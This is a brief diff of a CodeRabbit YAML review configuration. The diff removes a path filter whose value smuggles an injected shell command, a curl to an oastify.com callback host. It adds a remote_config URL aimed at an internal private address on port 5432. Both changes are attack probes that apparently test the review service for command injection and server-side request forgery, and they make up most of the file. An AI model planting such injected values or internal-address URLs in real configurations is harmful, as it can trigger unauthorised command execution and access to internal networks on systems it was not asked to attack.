@@ -1,4 +1,3 @@
 # yaml-language-server: $schema=https://coderabbit.ai/integrations/schema.v2.json
-reviews:
-  path_filters:
-    - src/**"; curl yiklh7o2mk6xzz11jlb56hppxg37rykm9.oastify.com;# "
+remote_config:
+  url: "http://10.19.0.14:5432/"
